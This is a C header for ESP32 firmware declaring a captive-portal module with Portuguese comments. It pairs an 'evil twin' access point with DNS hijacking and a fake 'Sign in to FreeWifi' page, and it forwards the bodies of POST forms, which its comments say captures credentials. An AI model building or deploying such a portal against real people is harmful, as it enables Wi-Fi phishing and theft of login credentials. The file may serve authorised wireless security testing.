#pragma once

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include "esp_err.h"

esp_err_t captive_portal_init(void);

// Sobe DNS hijack (UDP:53 respondendo com `redirect_ip` pra qualquer
// query) + HTTP server (TCP:80 servindo HTML configurável).
// Pré-requisito: `evil_twin_start` ativo (ou outra forma de SoftAP).
//
// Cada DNS query emite TLV_MSG_PORTAL_DNS_QUERY (0x2D) com IP do client + domínio.
// Cada HTTP request emite TLV_MSG_PORTAL_HTTP_REQ (0x2E) com IP + método +
// path + body chunk (até ~130 bytes — captura credenciais de POST forms).
//
// @param html         HTML servido pra todas requests (truncado se > heap).
//                     NULL ou vazio usa página default ("Sign in to FreeWifi").
// @param redirect_ip  IP usado na resposta DNS (4 bytes BE).
//                     Tipicamente o IP do AP (192.168.4.1 default no IDF).
esp_err_t captive_portal_start(const char *html, const uint8_t redirect_ip[4]);

esp_err_t captive_portal_stop(void);

bool captive_portal_busy(void);
